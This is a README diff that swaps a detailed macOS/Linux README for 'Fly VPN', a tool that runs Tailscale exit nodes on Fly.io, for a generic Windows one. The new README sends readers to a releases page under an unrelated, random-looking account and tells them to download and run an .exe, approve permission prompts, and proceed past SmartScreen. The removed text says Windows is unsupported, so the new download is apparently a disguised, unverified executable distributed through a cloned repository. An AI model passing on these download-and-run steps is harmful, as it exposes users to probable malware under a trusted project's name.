@@ -1,443 +1,144 @@
-# 🛡️ Fly VPN — disposable global VPN in seconds
+# 🌍 fly-vpn - Temporary VPN access in seconds
 
-**One API key. One command. Private exit node in 18 regions.**
+[![Download fly-vpn](https://img.shields.io/badge/Download%20fly--vpn-blue?style=for-the-badge)](https://github.com/milliammeterfamilyalligatoridae52/fly-vpn/releases)
 
-Fly VPN spins up an **ephemeral Tailscale exit node** on [Fly.io](https://fly.io), auto-configures your tailnet, routes your traffic, and **destroys everything** the moment you press Stop.
+## 🚀 What this app does
 
-```bash
-# 1. Clone & install
-git clone https://github.com/invilso/fly-vpn.git && cd fly-vpn && bash install.sh
+fly-vpn gives you a quick VPN route through a disposable Tailscale exit node on Fly.io. It is built for times when you need a private internet path for a short task, then want to shut it down.
 
-# 2. That's it. Paste your Tailscale API key when prompted.
-#    ACL, auth keys, device cleanup — all automatic.
-```
+You use a simple terminal window to start and manage it. The app handles the setup steps for you.
 
-No always-on VM. No manual ACL editing. No auth key management. No billing anxiety. No shared IPs.
+## 📥 Download and install on Windows
 
-Under the hood: WireGuard-powered [Tailscale](https://tailscale.com) mesh + [Fly Machines](https://fly.io/docs/machines/) that cold-start in ~3 seconds and bill per-second. A typical session costs **a fraction of a cent**.
+1. Open the release page: https://github.com/milliammeterfamilyalligatoridae52/fly-vpn/releases
+2. Download the Windows file from the latest release
+3. If the file comes in a ZIP archive, right-click it and choose Extract All
+4. Open the extracted folder
+5. Run the app file for Windows, usually an `.exe` file
+6. If Windows asks for permission, choose Yes
+7. Keep the terminal window open while you use the VPN
 
-<p align="center">
-  <img src="assets/demo.gif" alt="Fly VPN demo" width="700"/>
-</p>
+## 🖥️ Windows setup
 
----
+For best results on Windows:
 
-## Use cases
+- Use Windows 10 or Windows 11
+- Stay signed in with a normal user account
+- Make sure you have an internet connection before you start
+- Keep enough free space for the app and its temporary network files
+- If your browser or security tool asks about the download, allow it only if it came from the release page above
 
-- 🔒 **Test geo-restricted APIs** — hit endpoints as if you're in Frankfurt, Tokyo, or São Paulo
-- 🛡️ **Secure browsing on public Wi-Fi** — route traffic through your own ephemeral node
-- 🧪 **QA regional content** — verify localization, pricing, or CDN behavior per region
-- 🏗️ **Dev/staging access** — reach region-locked services without a permanent VPN
-- 🎯 **Ad & SEO audits** — see what users in different markets actually see
-- 🚀 **Demo day** — show your product from a client's region in real time
-- 🎮 **Gaming** — connect to region-locked servers or get a fresh IP in seconds
+If the app opens in a terminal window, that is normal. The interface uses text, not buttons and menus.
 
----
+## 🧭 How to use fly-vpn
 
-## Tech stack
+1. Start the app
+2. Follow the prompts in the terminal
+3. Let it create the temporary VPN session
+4. Wait until it shows that the exit node is ready
+5. Use your browser or other apps as you normally would
+6. Close the app when you are done
+7. Delete the files if you want to remove the local copy
 
-| Layer | Technology |
-|-------|------------|
-| Language | Python 3.14 |
-| TUI framework | [Textual](https://github.com/Textualize/textual) |
-| Cloud runtime | [Fly.io](https://fly.io) (ephemeral machines) |
-| VPN mesh | [Tailscale](https://tailscale.com) (WireGuard-based) |
-| Package manager | [uv](https://docs.astral.sh/uv/) |
-| Build backend | [Hatchling](https://hatch.pypa.io/) |
-| Linter | [Ruff](https://docs.astral.sh/ruff/) |
+The app is meant to be disposable. That means you can use it for a short session and then shut it down.
 
----
+## 🔐 What you get
 
-## Requirements
+- A temporary VPN path through an exit node
+- A setup flow that does not need deep technical knowledge
+- A terminal UI that keeps the process simple
+- A short-lived connection model for privacy-focused tasks
+- A tool that uses Fly.io for hosting and Tailscale for network access
 
-- macOS or Linux (Windows is **not** supported)
-- Python 3.14+
-- [Fly.io](https://fly.io) account with a payment method on file
-- [Fly.io CLI](https://fly.io/docs/flyctl/install/) (`fly`) — auto-installed by `install.sh`
-- [Tailscale](https://tailscale.com) account + **API key** (handles everything automatically) — **or** a self-hosted [Headscale](https://github.com/juanfont/headscale) server with an auth key
+## 🧱 Typical use cases
 
----
+fly-vpn fits tasks like:
 
-## Why teams love it
+- Checking how a site looks from another region
+- Using a private route for a short online session
+- Testing network access from a fresh endpoint
+- Keeping a temporary layer between your device and the internet
+- Running a VPN session without setting up a long-term service
 
-- 🔑 **One API key** — ACL, auth keys, cleanup — all automatic
-- 🌍 **18 gateway regions** — pick from dropdown, launch in seconds
-- ⚡ **One-click launch** from a polished terminal UI
-- 🔗 **Auto-connect** to the exit node when it comes online
-- 🧹 **Safe teardown** on Stop / Quit / Signal
-- 💸 **Cost-aware by design** — ephemeral infra only
-- 🛟 **Watchdog mode** to remove orphaned Fly apps
+## 🛠️ What to expect when the app runs
 
----
+When you open the app, it will guide you through a few steps in the terminal. You may see messages about:
 
-## What happens when you press Launch
+- Starting the session
+- Connecting to the network
+- Creating the exit node
+- Checking status
+- Ending the session
 
-1. 🔑 **ACL check** — ensures your tailnet allows exit nodes (idempotent, via API)
-2. 🔐 **Auth key** — generates a single-use, ephemeral key (valid 30 days, consumed instantly)
-3. 🚀 **Fly machine** — starts a Tailscale container in your chosen region (~3 s cold start)
-4. 🔗 **Auto-connect** — waits for the node to appear, then routes your traffic through it
-5. 🗑️ **Press Stop** — disconnects, destroys machine + app, removes device from tailnet
+This is normal. The app uses clear text prompts so you can follow along without learning a new system.
 
-> You provide one API key. Everything else is automated, per-session, and ephemeral.
+## 📦 Files and release notes
 
----
+The release page may include one or more files for Windows. Pick the file that matches your system. If there are notes with the release, read them before you run the app.
 
-## Quick start
+Download page:
+https://github.com/milliammeterfamilyalligatoridae52/fly-vpn/releases
 
-```bash
-git clone https://github.com/invilso/fly-vpn.git
-cd fly-vpn
-bash install.sh
-```
+## 🔧 Basic controls
 
-The installer will ask for one thing: your **Tailscale API key** ([generate here](https://login.tailscale.com/admin/settings/keys)).
+You can usually manage the app from the terminal with simple actions such as:
 
-That single key gives Fly VPN everything it needs:
-- ✅ **ACL auto-configuration** — exit-node tags, approvals, permissions
-- ✅ **Per-session auth keys** — generated on every Launch, single-use, ephemeral
-- ✅ **Instant device cleanup** — node deleted from tailnet on Stop
+- Start
+- Stop
+- Check status
+- Refresh
+- Exit
 
-No auth key to create. No ACL to edit. No manual steps.
+If the app asks for input, type the option it shows and press Enter.
 
-<details>
-<summary>Full installer flow</summary>
+## 🌐 Network and privacy details
 
-1. Installs **uv** and **Fly CLI** (if missing)
-2. Prompts for **TAILSCALE_API_KEY**
-3. Asks if you use **Headscale** — prompts for `TS_LOGIN_SERVER` and manual auth key
-4. Syncs dependencies
-5. Checks Fly.io auth (opens `fly auth login` if needed)
-6. Registers desktop entry (macOS Applications / GNOME menu)
-7. Optionally sets up daily **watchdog** (orphan-app safety net)
+fly-vpn uses a disposable setup, so it is built for short use. The exit node acts as the point where your traffic leaves the VPN path. That helps keep your real device path out of view from the sites you visit during that session.
 
-</details>
+Because it uses Tailscale and Fly.io, the setup is fit for users who want a fast path without handling a full VPN server by hand.
 
----
+## 💡 Tips for a smooth first run
 
-## Why Fly.io?
-
-| Criteria | Fly.io | AWS EC2 / Lightsail | DigitalOcean | Hetzner |
-|----------|--------|---------------------|--------------|----------|
-| Cold start | **~3 s** (Machines API) | 30–60 s | 30–55 s | 10–30 s |
-| Per-second billing | ✅ | ❌ (per-hour) | ❌ (per-hour) | ❌ (per-hour) |
-| Regions | 18 worldwide | 30+ | 15 | 5 |
-| Destroy on stop | native (Machines) | manual / API | manual / API | manual / API |
-| Free tier | 3 shared VMs, 160 GB out | 750 h/mo (t2.micro) | — | — |
-
-**Bottom line:** Fly Machines are **pay-per-second**, start in seconds, and auto-destroy — ideal for ephemeral workloads. No idle costs when the VPN is off.
-
-### Cost estimate
-
-| Usage | Fly.io cost |
-|-------|-------------|
-| 1 h/day, 30 days (shared-cpu-1x, 256 MB) | **~$0.50–1.00/mo** |
-| 4 h/day, 30 days | ~$2–4/mo |
-| Always-on equivalent (730 h) | ~$3.50/mo |
-
-> Compare: a \$5/mo DigitalOcean droplet runs 24/7 whether you need it or not. Fly VPN runs **only when you click Launch**.
-
----
-
-## Why Tailscale?
-
-| Criteria | Tailscale | OpenVPN | WireGuard (raw) | Cloudflare WARP |
-|----------|-----------|---------|-----------------|------------------|
-| Setup complexity | Zero-config mesh | Certs + config files | Key exchange + routing | Managed (no self-host) |
-| NAT traversal | ✅ built-in (DERP) | Manual / STUN | Manual | N/A |
-| Exit node support | ✅ native | Manual iptables | Manual iptables | ❌ |
-| Auto-approve nodes | ✅ via ACL tags | ❌ | ❌ | N/A |
-| Ephemeral nodes | ✅ (auto-expire keys) | ❌ | ❌ | N/A |
-| Protocol | WireGuard underneath | TLS / UDP | WireGuard | WireGuard (modified) |
-
-**Bottom line:** Tailscale gives us **WireGuard performance** with zero manual key management. Ephemeral auth keys + ACL auto-approval = nodes that appear, serve traffic, and vanish — no cleanup.
-
----
-
-## Approaches compared
-
-| Approach | Spin-up | Monthly cost (casual) | Cleanup | Multi-region |
-|----------|---------|----------------------|---------|-------------|
-| **Fly VPN (this project)** | ~5 s | **<$1** | automatic | ✅ 18 regions |
-| Commercial VPN (Mullvad, PIA…) | instant | $5–10 | N/A | ✅ but shared IPs |
-| Self-hosted WireGuard on VPS | 30–60 s | $5+ (always-on) | manual | one region per VPS |
-| SSH SOCKS proxy | instant | $5+ (always-on VPS) | manual | one region per VPS |
-| Outline VPN (Jigsaw) | 30–60 s | $5+ (always-on) | manual | one region per VPS |
-| Cloud Functions + proxy | varies | pay-per-request | automatic | ✅ but complex |
-
-**Fly VPN wins when you need:** your own IP (not shared), multi-region on demand, zero idle cost, and fully automated lifecycle.
-
----
-
-## Fly VPN vs fly-tailscale-exit
-
-[patte/fly-tailscale-exit](https://github.com/patte/fly-tailscale-exit) (1.6k ⭐) pioneered the idea of running Tailscale exit nodes on Fly.io. Fly VPN builds on the same concept but wraps it into a **zero-config product** instead of a DevOps guide.
-
-| | fly-tailscale-exit | Fly VPN |
-|---|---|---|
-| **Setup** | 13 manual steps | `bash install.sh` + paste API key |
-| **Keys to manage** | Auth key (create manually, keep alive) | None — generated per session |
-| **ACL configuration** | Manual (copy-paste into admin) | ✅ Automatic on first launch |
-| **Exit node approval** | Manual in Tailscale admin | ✅ Auto-approved via ACL |
-| **Connect to exit node** | `tailscale up --use-exit-node=…` | ✅ Automatic |
-| **Switch region** | Edit config + redeploy | Pick from dropdown → Launch |
-| **Cleanup on stop** | ❌ Machine keeps running (💸) | ✅ App + machine + device destroyed |
-| **Deployment model** | `fly deploy` (Dockerfile + fly.toml) | `fly m run` (no deploy, no repo) |
-| **GitHub org required** | ✅ | ❌ |
-| **UI** | None (CLI only) | Textual TUI with hotkeys |
-| **Cost safety net** | None | Watchdog (cron/launchd) |
-| **Headscale support** | ❌ | ✅ |
-| **Desktop integration** | None | macOS .app / GNOME menu |
-
-**tl;dr** — fly-tailscale-exit requires you to create keys, edit ACL, set up a GitHub org, deploy with Dockerfile, and manually connect. Fly VPN: paste one API key, press Launch.
-
-> **Credit where due** — fly-tailscale-exit proved the idea works. Fly VPN just makes it zero-config.
-
----
-
-## Tailscale setup (required once)
-
-### Just an API key — everything else is automatic
-
-Generate an API key at [Tailscale Admin → Keys → API keys](https://login.tailscale.com/admin/settings/keys) and paste it during install (or add to `.env`):
-
-```env
-TAILSCALE_API_KEY=tskey-api-…
-```
-
-On every Launch, Fly VPN will:
-
-| Step | What | When |
-|------|------|------|
-| ACL setup | Adds `tag:ephemeral-vpn`, exit-node attrs, auto-approvers | First launch (idempotent, skips if already configured) |
-| Auth key | Generates single-use, ephemeral, pre-authorized key | Every launch |
-| Device cleanup | Deletes the node from your tailnet | Every stop |
-
-You can also trigger ACL setup manually:
-
-```bash
-fly-vpn --setup-acl
-```
-
-<details>
-<summary>Manual auth key (without API key)</summary>
-
-If you prefer not to use an API key, create a **reusable, ephemeral, pre-authorized** auth key tagged with `tag:ephemeral-vpn` at the [Tailscale admin console](https://login.tailscale.com/admin/settings/keys):
-
-```env
-TAILSCALE_AUTHKEY=tskey-auth-…
-```
-
-You'll also need to configure ACL manually:
-
-```jsonc
-{
-  "tagOwners": {
-    "tag:ephemeral-vpn": ["autogroup:owner"]
-  },
-  "nodeAttrs": [
-    {
-      "target": ["tag:ephemeral-vpn"],
-      "attr": ["can-be-exit-node"]
-    }
-  ],
-  "autoApprovers": {
-    "exitNode": ["tag:ephemeral-vpn"]
-  }
-}
-```
-
-> With a manual auth key, ephemeral nodes auto-remove in ~5–30 min instead of instantly.
-
-</details>
-```
-
----
-
-## Self-hosted Tailscale (Headscale)
-
-[Headscale](https://github.com/juanfont/headscale) is an open-source, self-hosted implementation of the Tailscale coordination server.
-Fly VPN works with Headscale out of the box — just set the right env vars.
-
-### 1. Set `TS_LOGIN_SERVER` in `.env`
-
-The installer will ask if you use a self-hosted coordination server.
-If you skipped it, add the variable manually:
-
-```env
-TS_LOGIN_SERVER=https://hs.example.com
-```
-
-The Fly exit node will register with your Headscale instance instead of `login.tailscale.com`.
-
-### 2. Make sure your local client is on the same Headscale server
-
-```bash
-tailscale login --login-server=https://hs.example.com
-```
-
-Both the local machine and the Fly exit node must be on the **same** Headscale tailnet.
-
-### 3. Create an auth key via Headscale
-
-```bash
-# Headscale CLI
-headscale preauthkeys create --user your-user --reusable --ephemeral
-
-# or via Headscale API
-curl -X POST https://hs.example.com/api/v1/preauthkey \
-  -H "Authorization: Bearer $HS_API_KEY" \
-  -d '{"user":"your-user","reusable":true,"ephemeral":true}'
-```
-
-Put the key in `.env` as usual:
-
-```env
-TAILSCALE_AUTHKEY=your-headscale-preauth-key
-```
-
-### 4. ACL policy
-
-Headscale ACLs live in the config file (typically `/etc/headscale/acl.yaml` or `acl.json`).
-The same policy applies — allow the ephemeral tag and auto-approve exit nodes:
-
-```yaml
-# acl.yaml
-tagOwners:
-  tag:ephemeral-vpn:
-    - your-user
-
-autoApprovers:
-  exitNode:
-    - tag:ephemeral-vpn
-```
-
-### 5. Minimal `.env` for Headscale
-
-```env
-TAILSCALE_AUTHKEY=your-headscale-preauth-key
-TS_LOGIN_SERVER=https://hs.example.com
-```
-
-> No `TAILSCALE_API_KEY` needed — Headscale removes ephemeral nodes immediately on disconnect.
-
-### 6. Comparison
-
-| Feature | Tailscale SaaS | Headscale |
-|---------|---------------|-----------|
-| Auth keys | Admin console | `headscale preauthkeys create` |
-| ACL config | Web UI | Config file on server |
-| Instant device cleanup (`TAILSCALE_API_KEY`) | ✅ Supported | ❌ Not compatible — not needed |
-| Ephemeral node auto-remove | ~5–30 min | Immediate (on disconnect) |
-
----
-
-## Run
-
-```bash
-# Preferred
-fly-vpn
-
-# Alternatives
-uv run fly-vpn
-python main.py
-```
-
-### Keyboard shortcuts
-
-| Key | Action |
-|-----|--------|
-| `l` | Launch exit node |
-| `s` | Stop and cleanup |
-| `t` | Toggle dark/light theme |
-| `q` | Quit |
-
----
-
-## Safety model
-
-- Exit-node usage is explicit (manual Launch)
-- Exit route is removed during teardown
-- Fly app/machines are destroyed on cleanup paths
-- Tailscale device is removed instantly when API key is set (otherwise auto-removes in ~5–30 min)
-- Auth keys are generated per-session, single-use, ephemeral (when using API key)
-- Watchdog can be run from cron/CI to enforce cleanup
-
-> Fly VPN does **not** replace your identity/privacy model. It automates infra lifecycle and routing ergonomics.
-
----
-
-## Watchdog mode
-
-Cleanup helper for CI/cron/manual recovery:
-
-```bash
-python main.py --watchdog
-```
-
-It checks for orphaned app resources and destroys them to prevent charges.
-
-Tip: great as a daily cron safety net. The installer will offer to set this up automatically.
-
----
-
-## Troubleshooting quick hits
-
-- **"Fly.io not authenticated"** → run `fly auth login`
-- **Region timeout / no capacity** → switch region in UI and retry
-- **Node appears but no auto-connect** → run `tailscale set --exit-node=fly-vpn-exit`
-- **Want hard cleanup now** → run watchdog: `python main.py --watchdog`
-
----
-
-## Architecture (clean layered design)
-
-```
-flyexit/
-├── app.py            # UI layer (Textual only)
-├── session.py        # business orchestration (preflight/launch/connect/teardown)
-├── fly_ops.py        # Fly.io adapter (CLI operations)
-├── tailscale.py      # Tailscale adapter (local CLI)
-├── tailscale_api.py  # Tailscale Admin API client (ACL, auth keys, devices)
-├── acl_setup.py      # ACL business logic + CLI entry-point (--setup-acl)
-├── diagnosis.py      # friendly failure hints
-├── config.py         # persisted user config
-├── constants.py      # defaults, regions, timeouts
-├── styles.py         # UI styling
-└── watchdog.py       # headless safety cleanup
-
-main.py            # entry-point (app / watchdog / setup-acl)
-install.sh         # installer/uninstaller
-```
-
-Design principle: **UI-only app layer + enum-based session orchestration + thin infrastructure adapters**.
-
----
-
-## Uninstall
-
-```bash
-bash install.sh uninstall
-```
-
----
-
-## Roadmap
-
-- [ ] **Drop `flyctl` dependency** — replace all CLI calls with the [Fly.io Machines API](https://fly.io/docs/machines/api/) directly, removing the only heavy external binary requirement
-- [ ] **Windows support** — make installer, Tailscale integration, and routing work on Windows (PowerShell installer, Windows-native `tailscale.exe` path detection)
-- [ ] **Linux app package** — `.deb` / `.rpm` / AUR package for one-line install on Linux
-- [ ] **History screen in TUI** — a dedicated tab showing past sessions with region, duration, and cost (already implemented via `--stats`)
-- [ ] **Multiple simultaneous nodes** — spin up nodes in several regions at once and switch between them without teardown
-- [ ] **Auto-rotate on region failure** — if the chosen region has no capacity, automatically retry the next closest region instead of failing
-- [ ] **Connection latency indicator** — show live ping to the exit node in the status bar so you can pick the fastest region
-- [ ] **Long-session billing alert** — warn in the TUI after a configurable threshold (e.g. 2 h) to prevent accidental charges from a forgotten session
-- [ ] **macOS menu bar widget** — a tiny status icon that shows VPN on/off state and lets you stop the session without opening the full TUI
-- [ ] **Homebrew tap** — `brew install invilso/tap/fly-vpn` for a one-liner install without cloning the repo
-- [ ] **Custom machine size picker** — let the user choose Fly Machine CPU/RAM tier (e.g. `shared-cpu-1x` vs `performance-2x`) from the TUI
-- [ ] **Config profiles** — save named profiles (preferred region, machine size, etc.) and switch between them quickly
-
----
-
-## License
-
-MIT
+- Use the latest release from the link above
+- Keep the terminal window open until you finish
+- Do not close the app while the VPN is active
+- If you download a ZIP file, extract it before opening the app
+- If Windows SmartScreen appears, check that you used the official release page
+- If the terminal closes too fast, open it again from the folder and run the app there
+
+## 🧪 If the app does not start
+
+Try these steps:
+
+- Run the file again
+- Make sure you extracted the ZIP file first
+- Move the app to a simple folder like Downloads or Desktop
+- Check that your internet connection is live
+- Try running it with a normal Windows account
+- Download the newest release if the file looks incomplete
+
+## 📚 Project topics
+
+This project uses ideas from:
+
+- ephemeral
+- exit node
+- fly.io
+- networking
+- privacy
+- python
+- rich
+- tailscale
+- textual
+- tui
+- vpn
+
+## 🧭 Suggested first-time path
+
+1. Open the release page
+2. Download the latest Windows file
+3. Extract it if needed
+4. Start the app
+5. Follow the terminal prompts
+6. Use the VPN for your task
+7. Close the app when finished
